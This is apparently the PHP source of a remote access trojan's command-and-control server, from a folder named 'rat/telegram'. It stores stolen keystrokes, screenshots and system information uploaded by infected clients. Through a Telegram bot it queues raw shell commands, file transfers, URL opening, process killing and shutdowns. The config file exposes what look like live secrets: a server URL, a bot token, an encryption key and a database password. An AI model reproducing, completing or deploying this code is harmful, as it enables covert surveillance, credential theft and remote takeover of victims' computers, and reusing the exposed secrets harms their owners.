Folder Structure:
├── [FILE] api.php
├── [FILE] config.php
├── [FILE] crypto.php
├── [FILE] database.sql
├── [FILE] import_sql.php
├── [FILE] telegram_handler.php
└── [FILE] utils.php


File Contents:
----------------------------------------
File: D:\rat\telegram\api.php
----------------------------------------
<?php
require_once 'config.php';
require_once 'crypto.php';
require_once 'utils.php';
require_once 'telegram_handler.php';

header('Content-Type: application/json; charset=utf-8');

class ApiHandler {
    private $pdo;
    private $crypto;

    public function __construct() {
        $this->crypto = new Crypto();
        $this->connect_db();
        $this->ensure_directories();
    }

    private function connect_db() {
        try {
            $this->pdo = new PDO(
                "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
                Config::$DB_USER,
                Config::$DB_PASS,
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
            );
        } catch (PDOException $e) {
            $this->log_error("Database connection failed: " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['error' => 'Database error'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    }

    private function ensure_directories() {
        foreach ([Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR] as $dir) {
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
        }
    }

    public function handle_request() {
        $action = $_POST['action'] ?? $_GET['action'] ?? '';
        $this->log_webhook();

        if ($action === 'telegram_webhook') {
            $update = json_decode(file_get_contents('php://input'), true);
            TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $update);
            return;
        }

        if (!$this->verify_token()) {
            http_response_code(403);
            echo json_encode(['error' => 'Invalid token'], JSON_UNESCAPED_UNICODE);
            return;
        }

        switch ($action) {
            case 'upload_data':
                $this->handle_upload();
                break;
            case 'get_commands':
                $this->handle_get_commands();
                break;
            case 'command_response':
                $this->handle_command_response();
                break;
            case 'file_manager':
                $this->handle_file_manager();
                break;
            default:
                http_response_code(400);
                echo json_encode(['error' => 'Invalid action'], JSON_UNESCAPED_UNICODE);
        }
    }

    private function verify_token() {
        return isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN;
    }

    private function log_webhook() {
        $data = [
            'time' => date('Y-m-d H:i:s'),
            'method' => $_SERVER['REQUEST_METHOD'],
            'post' => $_POST,
            'get' => $_GET,
            'input' => file_get_contents('php://input')
        ];
        file_put_contents(Config::$WEBHOOK_LOG, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }

    private function handle_upload() {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');
        $system_info = json_decode($this->crypto->decrypt($_POST['system_info'] ?? ''), true);
        $screenshot = $_FILES['screenshot'] ?? null;

        $screenshot_path = null;
        if ($screenshot && $screenshot['error'] === UPLOAD_ERR_OK) {
            $screenshot_path = Config::$SCREENSHOT_DIR . time() . '_' . $client_id . '.png';
            move_uploaded_file($screenshot['tmp_name'], $screenshot_path);
        }

        $this->pdo->prepare("
            INSERT INTO client_data (client_id, keystrokes, screenshot_path, system_info, received_at)
            VALUES (?, ?, ?, ?, NOW())
        ")->execute([$client_id, $keystrokes, $screenshot_path, json_encode($system_info)]);

        $this->pdo->prepare("
            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
            VALUES (?, NOW(), ?, ?)
            ON DUPLICATE KEY UPDATE last_seen = NOW(), ip_address = ?, last_ip = ?
        ")->execute([$client_id, $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown']);

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_get_commands() {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $stmt = $this->pdo->prepare("
            SELECT id, command FROM commands
            WHERE client_id = ? AND status = 'pending'
        ");
        $stmt->execute([$client_id]);
        $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);

        $this->pdo->prepare("UPDATE commands SET status = 'sent' WHERE client_id = ? AND status = 'pending'")
            ->execute([$client_id]);

        echo json_encode(['commands' => $commands], JSON_UNESCAPED_UNICODE);
    }

    private function handle_command_response() {
        $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
        $result = json_decode($this->crypto->decrypt($_POST['result'] ?? ''), true);

        $this->pdo->prepare("
            UPDATE commands SET response = ?, status = 'completed', completed_at = NOW()
            WHERE id = ?
        ")->execute([json_encode($result), $command_id]);

        $chat_id = Utils::get_admin_chat_id($this->pdo);
        if ($chat_id) {
            TelegramHandler::send_telegram_message(
                $chat_id,
                "Command #$command_id executed:\n" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT),
                ['parse_mode' => 'HTML']
            );
        }

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_file_manager() {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $params = json_decode($this->crypto->decrypt($_POST['params'] ?? ''), true);
        $command = [
            'type' => 'file_operation',
            'params' => $params
        ];

        $stmt = $this->pdo->prepare("
            INSERT INTO commands (client_id, command, status, created_at)
            VALUES (?, ?, 'pending', NOW())
        ");
        $stmt->execute([$client_id, $this->crypto->encrypt(json_encode($command))]);

        echo json_encode(['status' => 'success', 'command_id' => $this->pdo->lastInsertId()], JSON_UNESCAPED_UNICODE);
    }

    private function log_error($message) {
        Utils::log_error($message);
    }
}

$api = new ApiHandler();
$api->handle_request();
?>

----------------------------------------
File: D:\rat\telegram\config.php
----------------------------------------
<?php
class Config {
    // Connection Settings
    public static $SERVER_URL = "https://fasitheme.ir/logger/api.php"; // آدرس سرور
    public static $BOT_TOKEN = "8085485178:AAGf-BatkGWqGD1yMdo1Vwf6GTBetY3UNIQ"; // توکن بات تلگرام
    public static $SECRET_TOKEN = "1"; // توکن مخفی برای کلاینت‌ها
    public static $ENCRYPTION_KEY = "nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo="; // کلید رمزنگاری (base64)
    public static $ADMIN_CHAT_ID = "5296263534";
    
    // Database Settings
    public static $DB_HOST = "localhost";
    public static $DB_NAME = "farhamag_logger";
    public static $DB_USER = "farhamag_logger";
    public static $DB_PASS = "ZDS5KwxNNL4EXCjSsrHV";
    
    // File Paths
    public static $SCREENSHOT_DIR = __DIR__ . "/screenshots/";
    public static $UPLOAD_DIR = __DIR__ . "/uploads/";
    public static $ERROR_LOG = __DIR__ . "/log/error.log";
    public static $WEBHOOK_LOG = __DIR__ . "/log/webhook.log";
    public static $TELEGRAM_LOG = __DIR__ . "/log/telegram_update.log";
    
    // Other Settings
    public static $COMMAND_TIMEOUT = 10; // ثانیه
    public static $MAX_LOG_SIZE = 1024 * 1024; // 1MB
}
?>

----------------------------------------
File: D:\rat\telegram\crypto.php
----------------------------------------
<?php
require_once 'config.php';

class Crypto {
    private $key;

    public function __construct() {
        $this->key = base64_decode(Config::$ENCRYPTION_KEY);
        $this->validate_key();
    }

    private function validate_key() {
        if (strlen($this->key) !== 32) {
            throw new Exception("Invalid encryption key length");
        }
    }

    public function encrypt($data) {
        $iv = openssl_random_pseudo_bytes(16);
        $ciphertext = openssl_encrypt(
            is_array($data) ? json_encode($data) : $data,
            'AES-256-CBC',
            $this->key,
            OPENSSL_RAW_DATA,
            $iv
        );
        return base64_encode($ciphertext) . '::' . base64_encode($iv);
    }

    public function decrypt($data) {
        if (empty($data) || !is_string($data) || !strpos($data, '::')) {
            throw new Exception("Invalid encrypted data format");
        }

        list($ciphertext_b64, $iv_b64) = explode('::', $data);
        $ciphertext = base64_decode($ciphertext_b64);
        $iv = base64_decode($iv_b64);

        $plaintext = openssl_decrypt(
            $ciphertext,
            'AES-256-CBC',
            $this->key,
            OPENSSL_RAW_DATA,
            $iv
        );

        if ($plaintext === false) {
            throw new Exception("Decryption failed");
        }

        return $plaintext;
    }
}
?>

----------------------------------------
File: D:\rat\telegram\database.sql
----------------------------------------
CREATE TABLE client_data (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    keystrokes TEXT,
    screenshot_path VARCHAR(255),
    system_info JSON,
    received_at DATETIME NOT NULL,
    INDEX idx_client_id (client_id)
);

CREATE TABLE users (
    client_id VARCHAR(32) PRIMARY KEY,
    last_seen DATETIME NOT NULL,
    ip_address VARCHAR(45),
    last_ip VARCHAR(45)
);

CREATE TABLE commands (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    command TEXT NOT NULL,
    response JSON,
    status ENUM('pending', 'sent', 'completed') NOT NULL DEFAULT 'pending',
    created_at DATETIME NOT NULL,
    completed_at DATETIME,
    INDEX idx_client_id_status (client_id, status)
);

CREATE TABLE allowed_users (
    chat_id BIGINT PRIMARY KEY
);

CREATE TABLE user_typelogs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    chat_id BIGINT NOT NULL,
    keystrokes TEXT,
    created_at DATETIME NOT NULL
);

INSERT INTO allowed_users (chat_id) VALUES ('YOUR_ADMIN_CHAT_ID');

----------------------------------------
File: D:\rat\telegram\import_sql.php
----------------------------------------
<?php
// import_sql.php

require_once 'config.php';

try {
    $pdo = new PDO(
        "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
        Config::$DB_USER,
        Config::$DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]
    );

    $sqlFile = __DIR__ . '/database.sql';

    if (!file_exists($sqlFile)) {
        throw new Exception("فایل database.sql پیدا نشد.");
    }

    $sqlContent = file_get_contents($sqlFile);

    $pdo->exec($sqlContent);

    echo "✅ وارد کردن فایل SQL با موفقیت انجام شد.";
} catch (PDOException $e) {
    echo "❌ خطای پایگاه داده: " . $e->getMessage();
} catch (Exception $e) {
    echo "❌ خطا: " . $e->getMessage();
}


----------------------------------------
File: D:\rat\telegram\telegram_handler.php
----------------------------------------
<?php
require_once 'config.php';
require_once 'utils.php';

class TelegramHandler {
    public static function handle_telegram_update($pdo, $crypto, $update) {
        $chat_id = $update['message']['chat']['id'] ?? $update['callback_query']['from']['id'] ?? 0;
        
        if (!self::is_authorized($chat_id)) {
            self::send_telegram_message($chat_id, "Access denied. Only the authorized admin can use this bot.");
            return;
        }

        if (isset($update['callback_query'])) {
            self::process_callback($pdo, $crypto, $update['callback_query']);
        } elseif (isset($update['message'])) {
            self::process_message($pdo, $crypto, $update['message']);
        }

        self::log_update($update);
    }

    private static function is_authorized($chat_id) {
        return $chat_id == Config::$ADMIN_CHAT_ID;
    }

    private static function process_message($pdo, $crypto, $message) {
        $chat_id = $message['chat']['id'];
        $text = $message['text'] ?? '';

        if (isset($message['document'])) {
            self::handle_file_upload($pdo, $crypto, $message);
            return;
        }

        switch ($text) {
            case '/start':
                self::show_client_list($pdo, $chat_id);
                break;
            case '/cmd':
                self::send_telegram_message($chat_id, "Please send the raw command.");
                break;
            case '/screens':
                self::show_screenshots($pdo, $chat_id);
                break;
            case '/logs':
                self::show_logs($chat_id);
                break;
            case '/browse':
                self::send_command($pdo, $crypto, $chat_id, 'file_operation', ['action' => 'list']);
                break;
            case '/get-info':
                self::send_command($pdo, $crypto, $chat_id, 'system_info', []);
                break;
            case '/go':
                self::send_telegram_message($chat_id, "Please send the URL to open.");
                break;
            case '/users':
                self::show_client_list($pdo, $chat_id);
                break;
            case '/shutdown':
            case '/restart':
            case '/sleep':
            case '/signout':
                self::send_command($pdo, $crypto, $chat_id, 'system_command', ['command' => substr($text, 1)]);
                break;
            case '/startup':
            case '/tasks':
                self::send_command($pdo, $crypto, $chat_id, 'process_management', ['action' => $text === '/startup' ? 'list' : 'list']);
                break;
            default:
                if (strpos($text, '/cmd ') === 0) {
                    self::send_command($pdo, $crypto, $chat_id, 'raw_command', ['command' => substr($text, 5)]);
                } elseif (strpos($text, '/go ') === 0) {
                    self::send_command($pdo, $crypto, $chat_id, 'open_url', ['url' => substr($text, 4)]);
                } else {
                    self::send_telegram_message($chat_id, "Unknown command. Use /start to begin.");
                }
        }
    }

    private static function process_callback($pdo, $crypto, $callback) {
        $chat_id = $callback['from']['id'];
        $data = json_decode($callback['data'], true);
        $client_id = $data['client_id'] ?? '';
        $action = $data['action'] ?? '';

        if ($action === 'select_client') {
            self::show_access_menu($pdo, $chat_id, $client_id);
        } elseif ($action === 'terminate_process') {
            self::send_command($pdo, $crypto, $chat_id, 'process_management', [
                'action' => 'terminate',
                'pid' => $data['pid']
            ]);
        }
    }

    private static function show_client_list($pdo, $chat_id) {
        $stmt = $pdo->prepare("SELECT client_id, last_seen FROM users WHERE last_seen > DATE_SUB(NOW(), INTERVAL 1 HOUR)");
        $stmt->execute();
        $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

        if (!$clients) {
            self::send_telegram_message($chat_id, "No online clients found.");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        foreach ($clients as $client) {
            $keyboard['inline_keyboard'][] = [[
                'text' => $client['client_id'] . ' (' . $client['last_seen'] . ')',
                'callback_data' => json_encode(['action' => 'select_client', 'client_id' => $client['client_id']])
            ]];
        }

        self::send_telegram_message($chat_id, "Select a client:", ['reply_markup' => $keyboard]);
    }

    private static function show_access_menu($pdo, $chat_id, $client_id) {
        $keyboard = ['inline_keyboard' => [
            [['text' => 'Get Info', 'callback_data' => json_encode(['action' => 'get_info', 'client_id' => $client_id])]],
            [['text' => 'Browse Files', 'callback_data' => json_encode(['action' => 'browse', 'client_id' => $client_id])]],
            [['text' => 'Shutdown', 'callback_data' => json_encode(['action' => 'shutdown', 'client_id' => $client_id])]],
            [['text' => 'Restart', 'callback_data' => json_encode(['action' => 'restart', 'client_id' => $client_id])]],
        ]];

        self::send_telegram_message($chat_id, "Access menu for client $client_id:", ['reply_markup' => $keyboard]);
    }

    private static function show_screenshots($pdo, $chat_id) {
        $stmt = $pdo->prepare("SELECT screenshot_path FROM client_data WHERE screenshot_path IS NOT NULL ORDER BY received_at DESC LIMIT 5");
        $stmt->execute();
        $screenshots = $stmt->fetchAll(PDO::FETCH_ASSOC);

        foreach ($screenshots as $screenshot) {
            self::send_telegram_message($chat_id, null, ['photo' => curl_file_create($screenshot['screenshot_path'])]);
        }
    }

    private static function show_logs($chat_id) {
        if (file_exists(Config::$ERROR_LOG)) {
            $logs = file_get_contents(Config::$ERROR_LOG);
            self::send_telegram_message($chat_id, "Error logs:\n" . htmlspecialchars($logs));
        } else {
            self::send_telegram_message($chat_id, "No logs found.");
        }
    }

    private static function send_command($pdo, $crypto, $chat_id, $type, $params) {
        $client_id = Utils::sanitize_input($params['client_id'] ?? '');
        $command = ['type' => $type, 'params' => $params];

        $stmt = $pdo->prepare("
            INSERT INTO commands (client_id, command, status, created_at)
            VALUES (?, ?, 'pending', NOW())
        ");
        $stmt->execute([$client_id, $crypto->encrypt(json_encode($command))]);

        self::send_telegram_message($chat_id, "Command sent to client $client_id.");
    }

    private static function handle_file_upload($pdo, $crypto, $message) {
        $chat_id = $message['chat']['id'];
        $file_id = $message['document']['file_id'];
        $file = self::get_telegram_file($file_id);
        
        $file_path = Config::$UPLOAD_DIR . $message['document']['file_name'];
        file_put_contents($file_path, $file);

        self::send_command($pdo, $crypto, $chat_id, 'file_operation', [
            'action' => 'upload',
            'path' => $file_path
        ]);
    }

    private static function get_telegram_file($file_id) {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getFile?file_id=$file_id";
        $response = json_decode(file_get_contents($url), true);
        $file_path = $response['result']['file_path'];
        return file_get_contents("https://api.telegram.org/file/bot" . Config::$BOT_TOKEN . "/$file_path");
    }

    public static function send_telegram_message($chat_id, $text, $options = []) {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/" . ($options['photo'] ? 'sendPhoto' : 'sendMessage');
        $data = array_merge([
            'chat_id' => $chat_id,
            'text' => $text,
            'parse_mode' => 'HTML'
        ], $options);

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }

    private static function log_update($update) {
        file_put_contents(Config::$TELEGRAM_LOG, json_encode($update, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}
?>

----------------------------------------
File: D:\rat\telegram\utils.php
----------------------------------------
<?php
require_once 'config.php';

class Utils {
    public static function sanitize_input($input) {
        return htmlspecialchars(strip_tags(trim($input)));
    }

    public static function get_admin_chat_id($pdo) {
        return Config::$ADMIN_CHAT_ID;
    }

    public static function log_error($message) {
        $log_entry = [
            'time' => date('Y-m-d H:i:s'),
            'message' => $message
        ];
        file_put_contents(Config::$ERROR_LOG, json_encode($log_entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}
?>
